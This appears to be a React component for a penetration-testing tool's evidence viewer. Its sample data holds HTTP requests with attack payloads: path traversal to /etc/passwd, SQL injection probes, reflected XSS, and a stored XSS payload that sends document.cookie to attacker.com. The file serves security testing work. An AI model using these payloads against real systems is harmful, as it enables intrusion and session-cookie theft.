import { useState } from "react"
import { Search, X, Copy, ExternalLink, Cpu, Filter, Database, Loader2 } from "lucide-react"

interface EvidenceRow {
  id: string
  ts: string
  method: string
  url: string
  status: number
  size: string
  finding: string
  severity: string
  request: string
  response: string
}

interface EvidenceProps {
  onNavigate: (page: string) => void
  onSendToRepeater: (reqData: any) => void
}

const ROWS: EvidenceRow[] = [
  {
    id: "EVD-1041",
    ts: "14:26:02",
    method: "GET",
    url: "/export?file=../../etc/passwd",
    status: 200,
    size: "1.8 KB",
    finding: "VLN-0247",
    severity: "Critical",
    request: "GET /export?file=../../etc/passwd HTTP/1.1\nHost: api.acmecorp.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ\nAccept: */*\nUser-Agent: curl/7.68.0",
    response: "HTTP/1.1 200 OK\nContent-Type: text/plain\nServer: Nginx\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nadmin:x:1001:1001::/home/admin:/bin/bash",
  },
  {
    id: "EVD-1040",
    ts: "14:24:31",
    method: "GET",
    url: "/api/users?user_id=1' AND 1=1--",
    status: 200,
    size: "412 B",
    finding: "VLN-0246",
    severity: "Critical",
    request: "GET /api/users?user_id=1' AND 1=1-- HTTP/1.1\nHost: api.acmecorp.com\nAccept: application/json\nX-Requested-With: XMLHttpRequest",
    response: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  "status": "success",\n  "data": {\n    "id": 1,\n    "username": "admin",\n    "email": "admin@acmecorp.com"\n  }\n}',
  },
  {
    id: "EVD-1039",
    ts: "14:23:58",
    method: "GET",
    url: "/api/users?user_id=1' AND 1=2--",
    status: 404,
    size: "68 B",
    finding: "VLN-0246",
    severity: "Critical",
    request: "GET /api/users?user_id=1' AND 1=2-- HTTP/1.1\nHost: api.acmecorp.com\nAccept: application/json",
    response: 'HTTP/1.1 404 Not Found\nContent-Type: application/json\n\n{\n  "error": "User not found",\n  "code": 404\n}',
  },
  {
    id: "EVD-1038",
    ts: "14:28:11",
    method: "GET",
    url: "/search?q=<script>alert(1)</script>",
    status: 200,
    size: "3.2 KB",
    finding: "VLN-0245",
    severity: "High",
    request: "GET /search?q=<script>alert(1)</script> HTTP/1.1\nHost: api.acmecorp.com\nCookie: session=ab12cd34ef56",
    response: "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<html>\n  <body>\n    <p>No search results for <script>alert(1)</script></p>\n  </body>\n</html>",
  },
  {
    id: "EVD-1037",
    ts: "14:20:14",
    method: "GET",
    url: "/admin/export?report_id=4821",
    status: 200,
    size: "94.1 KB",
    finding: "VLN-0244",
    severity: "High",
    request: "GET /admin/export?report_id=4821 HTTP/1.1\nHost: api.acmecorp.com\nAuthorization: Bearer user_token_A\nAccept: application/pdf",
    response: 'HTTP/1.1 200 OK\nContent-Type: application/pdf\nContent-Disposition: attachment; filename="report-org-B-2026-07.pdf"\n\n%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n...',
  },
  {
    id: "EVD-1036",
    ts: "14:18:22",
    method: "POST",
    url: "/api/profile",
    status: 200,
    size: "248 B",
    finding: "VLN-0245",
    severity: "High",
    request: 'POST /api/profile HTTP/1.1\nHost: api.acmecorp.com\nContent-Type: application/json\nContent-Length: 104\n\n{\n  "description": "<img src=x onerror=fetch(\'https://attacker.com/?c=\'+document.cookie)>"\n}',
    response: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  "success": true,\n  "updated": true\n}',
  },
]

const SEV_CONFIG: Record<string, string> = {
  Critical: "text-critical bg-critical/10 border-critical/20",
  High: "text-high bg-high/10 border-high/20",
  Medium: "text-medium bg-medium/10 border-medium/20",
  Low: "text-low bg-low/10 border-low/20",
}

const SEV_BORDERS: Record<string, string> = {
  Critical: "border-l-4 border-l-critical",
  High: "border-l-4 border-l-high",
  Medium: "border-l-4 border-l-medium",
  Low: "border-l-4 border-l-low",
}

const METHOD_COLORS: Record<string, string> = {
  GET: "text-emerald bg-emerald/5 border border-emerald/15 px-1.5 py-0.5 rounded text-[10px]",
  POST: "text-accent bg-accent/5 border border-accent/15 px-1.5 py-0.5 rounded text-[10px]",
  PUT: "text-medium bg-medium/5 border border-medium/15 px-1.5 py-0.5 rounded text-[10px]",
  DELETE: "text-critical bg-critical/5 border border-critical/15 px-1.5 py-0.5 rounded text-[10px]",
}

const STATUS_COLORS = (s: number) =>
  s < 300 ? "text-emerald" : s < 400 ? "text-medium" : s < 500 ? "text-high" : "text-critical"

export default function Evidence({ onSendToRepeater }: EvidenceProps) {
  const [selected, setSelected] = useState<EvidenceRow | null>(null)
  const [respTab, setRespTab] = useState<"request" | "response" | "hex">("request")
  const [search, setSearch] = useState("")
  const [sevFilter, setSevFilter] = useState("all")
  const [methodFilter, setMethodFilter] = useState("all")
  
  // Repeater transition feedback state
  const [sendingId, setSendingId] = useState<string | null>(null)

  const filtered = ROWS.filter(
    (r) => {
      const matchSearch = r.url.toLowerCase().includes(search.toLowerCase()) ||
                          r.id.toLowerCase().includes(search.toLowerCase()) ||
                          r.finding.toLowerCase().includes(search.toLowerCase())
      const matchSev = sevFilter === "all" ? true : r.severity.toLowerCase() === sevFilter
      const matchMethod = methodFilter === "all" ? true : r.method.toLowerCase() === methodFilter
      return matchSearch && matchSev && matchMethod
    }
  )

  const criticalCount = ROWS.filter(r => r.severity === "Critical").length
  const highCount = ROWS.filter(r => r.severity === "High").length

  // Live Hex Dump generator for maximum high fidelity
  const parseHexDump = (str: string) => {
    const result: { offset: string; hex: string; ascii: string }[] = []
    const bytes = Array.from(new TextEncoder().encode(str))
    for (let i = 0; i < Math.min(bytes.length, 512); i += 16) {
      const chunk = bytes.slice(i, i + 16)
      const hex = chunk.map((b) => b.toString(16).padStart(2, "0")).join(" ")
      const ascii = chunk
        .map((b) => (b >= 32 && b <= 126 ? String.fromCharCode(b) : "."))
        .join("")
      const offset = i.toString(16).padStart(4, "0")
      result.push({ offset, hex, ascii })
    }
    return result
  }

  const toHexDump = (str: string) => {
    return parseHexDump(str)
      .map(r => `${r.offset}  ${r.hex.padEnd(48, " ")}  |${r.ascii}|`)
      .join("\n")
  }

  const handleCopyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text)
  }

  const handleForwardToRepeater = (row: EvidenceRow) => {
    setSendingId(row.id)
    setTimeout(() => {
      onSendToRepeater({
        method: row.method,
        url: row.url,
        body: row.request.split("\n\n")[1] || "",
        status: row.status,
        response: row.response,
      })
      setSendingId(null)
    }, 1000)
  }

  const renderHighlightedPayload = (text: string) => {
    const lines = text.split("\n")
    const headerLines: string[] = []
    let bodyText = ""
    let isBody = false
    for (const line of lines) {
      if (isBody) {
        bodyText += line + "\n"
      } else if (line.trim() === "") {
        isBody = true
      } else {
        headerLines.push(line)
      }
    }

    return (
      <div className="font-mono text-xs leading-relaxed space-y-3.5">
        <div className="border-b border-border/40 pb-2 mb-2">
          <span className="text-[9px] uppercase tracking-wider text-ink-3 font-semibold block mb-1.5">HTTP Headers</span>
          <div className="space-y-1 bg-[#090c14]/40 p-2.5 rounded border border-border/40">
            {headerLines.map((line, idx) => {
              const colonIdx = line.indexOf(":")
              if (colonIdx > 0) {
                const key = line.slice(0, colonIdx)
                const val = line.slice(colonIdx + 1)
                return (
                  <div key={idx} className="flex text-[11px] leading-relaxed">
                    <span className="text-purple-400 font-semibold shrink-0">{key}:</span>
                    <span className="text-emerald-300 truncate ml-1">{val}</span>
                  </div>
                )
              }
              const parts = line.split(" ")
              if (parts.length >= 2) {
                return (
                  <div key={idx} className="text-indigo-200 font-bold border-b border-border/20 pb-1 mb-1 text-[11px]">
                    <span className="text-accent">{parts[0]}</span>{" "}
                    <span className="text-amber-300">{parts[1]}</span>{" "}
                    <span className="text-ink-3">{parts.slice(2).join(" ")}</span>
                  </div>
                )
              }
              return <div key={idx} className="text-indigo-200 text-[11px]">{line}</div>
            })}
          </div>
        </div>
        {bodyText.trim() && (
          <div>
            <span className="text-[9px] uppercase tracking-wider text-ink-3 font-semibold block mb-1">Payload Body</span>
            <pre className="text-indigo-200 bg-black/40 border border-border/60 p-3 rounded overflow-x-auto whitespace-pre text-[11px] leading-relaxed">
              {bodyText.trim()}
            </pre>
          </div>
        )}
      </div>
    )
  }

  return (
    <div className="flex h-full min-h-0 overflow-hidden bg-canvas">
      {/* ── Left list ── */}
      <div className={`flex flex-col overflow-hidden transition-all duration-200 ${selected ? "w-[50%]" : "w-full"}`}>
        
        {/* Statistics Banner Widgets */}
        <div className="px-5 py-4 bg-[#0a0d16] border-b border-border flex items-center gap-6 shrink-0">
          <div className="flex items-center gap-2">
            <Database size={16} className="text-accent" />
            <div>
              <span className="text-[9px] font-mono text-ink-3 uppercase block font-semibold">Evidence Logs</span>
              <span className="text-ink text-sm font-bold font-mono">{ROWS.length} Recorded</span>
            </div>
          </div>
          <div className="w-px h-6 bg-border" />
          <div className="flex items-center gap-2">
            <span className="relative flex h-2 w-2">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-critical opacity-75"></span>
              <span className="relative inline-flex rounded-full h-2 w-2 bg-critical"></span>
            </span>
            <div>
              <span className="text-[9px] font-mono text-ink-3 uppercase block font-semibold">Critical Threats</span>
              <span className="text-critical text-sm font-bold font-mono">{criticalCount} Flagged</span>
            </div>
          </div>
          <div className="w-px h-6 bg-border" />
          <div className="flex items-center gap-2">
            <span className="relative flex h-2 w-2">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-high opacity-75"></span>
              <span className="relative inline-flex rounded-full h-2 w-2 bg-high"></span>
            </span>
            <div>
              <span className="text-[9px] font-mono text-ink-3 uppercase block font-semibold">High Exposure</span>
              <span className="text-high text-sm font-bold font-mono">{highCount} Flagged</span>
            </div>
          </div>
        </div>

        {/* Filters Toolbar */}
        <div className="px-5 py-3 border-b border-border flex items-center justify-between bg-panel/20 shrink-0 gap-3">
          <div className="flex items-center gap-2">
            <Filter size={12} className="text-ink-3" />
            <span className="text-ink-2 text-xs font-semibold">Filter Corpus</span>
          </div>

          <div className="flex items-center gap-2.5 ml-auto">
            {/* Severity Filter Dropdown */}
            <select
              value={sevFilter}
              onChange={(e) => setSevFilter(e.target.value)}
              className="bg-canvas border border-border rounded px-2.5 py-1 text-ink-2 text-[10px] font-semibold focus:border-accent"
            >
              <option value="all">All Severities</option>
              <option value="critical">Critical</option>
              <option value="high">High</option>
              <option value="medium">Medium</option>
              <option value="low">Low</option>
            </select>

            {/* Method Filter Dropdown */}
            <select
              value={methodFilter}
              onChange={(e) => setMethodFilter(e.target.value)}
              className="bg-canvas border border-border rounded px-2.5 py-1 text-ink-2 text-[10px] font-semibold focus:border-accent"
            >
              <option value="all">All Methods</option>
              <option value="get">GET</option>
              <option value="post">POST</option>
              <option value="put">PUT</option>
              <option value="delete">DELETE</option>
            </select>

            {/* Search Input */}
            <div className="w-[180px] flex items-center gap-2 bg-canvas border border-border rounded px-2.5 py-1">
              <Search size={11} className="text-ink-3" />
              <input
                type="text"
                placeholder="Search..."
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                className="bg-transparent text-ink text-[10px] placeholder:text-ink-3 flex-1 focus:outline-none"
              />
            </div>
          </div>
        </div>

        {/* List table */}
        <div className="flex-1 overflow-y-auto">
          <table className="w-full border-collapse">
            <thead className="sticky top-0 bg-[#0c1018] border-b border-border text-[9px] font-bold text-ink-3 uppercase font-mono z-10">
              <tr>
                <th className="px-4 py-2.5 text-left pl-5 w-24">ID</th>
                <th className="px-4 py-2.5 text-left w-20">Time</th>
                <th className="px-4 py-2.5 text-left w-16">Method</th>
                <th className="px-4 py-2.5 text-left">URL</th>
                <th className="px-4 py-2.5 text-left w-20">Status</th>
                <th className="px-4 py-2.5 text-left w-20">Size</th>
                <th className="px-4 py-2.5 text-left w-28">Ref Vuln</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-border/60">
              {filtered.map((r) => {
                const isRowSelected = selected?.id === r.id
                return (
                  <tr
                    key={r.id}
                    onClick={() => {
                      setSelected(isRowSelected ? null : r)
                      setRespTab("request")
                    }}
                    className={`text-xs cursor-pointer transition-all ${SEV_BORDERS[r.severity]} ${
                      isRowSelected ? "bg-accent/10 border-l-accent" : "hover:bg-elevated/20"
                    }`}
                  >
                    <td className="pl-5 pr-4 py-3 text-ink-3 font-mono font-medium">{r.id}</td>
                    <td className="px-4 py-3 text-ink-3 font-mono">{r.ts}</td>
                    <td className="px-4 py-3">
                      <span className={METHOD_COLORS[r.method] ?? "text-ink"}>
                        {r.method}
                      </span>
                    </td>
                    <td className="px-4 py-3 text-ink font-mono truncate max-w-[200px]" title={r.url}>
                      {r.url}
                    </td>
                    <td className="px-4 py-3">
                      <span className={`font-mono font-semibold ${STATUS_COLORS(r.status)}`}>
                        {r.status}
                      </span>
                    </td>
                    <td className="px-4 py-3 text-ink-3 font-mono">{r.size}</td>
                    <td className="px-4 py-3">
                      <div className="flex items-center gap-1.5 font-mono">
                        <span className="text-accent text-[10px] font-semibold">{r.finding}</span>
                        <span className={`px-1.5 py-px rounded border text-[9px] font-semibold uppercase ${SEV_CONFIG[r.severity]}`}>
                          {r.severity}
                        </span>
                      </div>
                    </td>
                  </tr>
                )
              })}
            </tbody>
          </table>
          {filtered.length === 0 && (
            <div className="py-12 text-center text-ink-3 text-xs italic">
              No evidence matching selected filters found.
            </div>
          )}
        </div>
      </div>

      {/* ── Right Detail pane ── */}
      {selected && (
        <div className="flex-1 border-l border-border flex flex-col bg-card overflow-hidden">
          <div className="flex items-center justify-between px-4 py-3 border-b border-border shrink-0 bg-panel/30">
            <div className="flex items-center gap-2">
              <span className="text-ink-3 text-[10px] font-mono uppercase bg-canvas border border-border px-1.5 py-0.5 rounded">
                {selected.id}
              </span>
              <span className={METHOD_COLORS[selected.method]}>
                {selected.method}
              </span>
              <span className={`text-xs font-mono font-semibold ${STATUS_COLORS(selected.status)}`}>
                {selected.status}
              </span>
            </div>
            <button onClick={() => setSelected(null)} className="text-ink-3 hover:text-ink transition-colors">
              <X size={14} />
            </button>
          </div>

          <div className="px-4 py-2 bg-[#090c14]/40 border-b border-border shrink-0">
            <p className="text-ink font-mono text-[11px] select-all break-all">{selected.url}</p>
          </div>

          <div className="flex border-b border-border shrink-0 bg-[#0f1420]">
            {(["request", "response", "hex"] as const).map((t) => (
              <button
                key={t}
                onClick={() => setRespTab(t)}
                className={`px-4 py-2.5 text-xs capitalize border-b-2 -mb-px transition-colors ${
                  respTab === t ? "border-accent text-ink" : "border-transparent text-ink-3 hover:text-ink-2"
                }`}
              >
                {t === "hex" ? "Hex Dump" : t}
              </button>
            ))}
            <div className="ml-auto px-3 flex items-center gap-2">
              <button
                onClick={() =>
                  handleCopyToClipboard(
                    respTab === "request"
                      ? selected.request
                      : respTab === "response"
                        ? selected.response
                        : toHexDump(selected.response)
                  )
                }
                title="Copy payload to clipboard"
                className="text-ink-3 hover:text-ink transition-colors p-1"
              >
                <Copy size={12} />
              </button>
            </div>
          </div>

          {/* Tab Content */}
          <div className="flex-1 overflow-auto bg-[#090c14] p-4 border-b border-border">
            {respTab === "hex" ? (
              <div className="font-mono text-[10px] leading-relaxed overflow-x-auto select-all bg-black/40 border border-border/40 rounded p-3 text-ink-3">
                <div className="text-ink-3 opacity-60 border-b border-border/20 pb-1.5 mb-2 grid grid-cols-12 gap-2 font-semibold font-mono">
                  <div className="col-span-2">OFFSET</div>
                  <div className="col-span-7">HEXADECIMAL PAYLOAD</div>
                  <div className="col-span-3 border-l border-border/25 pl-2">ASCII</div>
                </div>
                <div className="space-y-1">
                  {parseHexDump(selected.response).map((row, idx) => (
                    <div key={idx} className="grid grid-cols-12 gap-2 hover:bg-elevated/10 py-0.5 rounded font-mono">
                      <span className="col-span-2 text-indigo-400 font-bold">{row.offset}</span>
                      <span className="col-span-7 text-cyan-300 tracking-wider whitespace-pre">{row.hex.padEnd(48, " ")}</span>
                      <span className="col-span-3 text-amber-300 border-l border-border/20 pl-2">{row.ascii}</span>
                    </div>
                  ))}
                </div>
              </div>
            ) : (
              renderHighlightedPayload(respTab === "request" ? selected.request : selected.response)
            )}
          </div>

          {/* Workbench Actions */}
          <div className="border-t border-border px-4 py-3 flex items-center bg-panel/30 shrink-0">
            <button
              onClick={() => handleForwardToRepeater(selected)}
              disabled={sendingId !== null}
              className="flex items-center gap-1.5 px-4 py-2 bg-accent text-white rounded text-xs font-bold hover:bg-accent/90 transition-colors shadow shadow-accent/20 disabled:opacity-75"
            >
              {sendingId === selected.id ? (
                <>
                  <Loader2 size={12} className="animate-spin" />
                  <span>Forwarding Request...</span>
                </>
              ) : (
                <>
                  <Cpu size={12} />
                  <span>Send Request to Repeater</span>
                  <ExternalLink size={11} />
                </>
              )}
            </button>
          </div>
        </div>
      )}
    </div>
  )
}
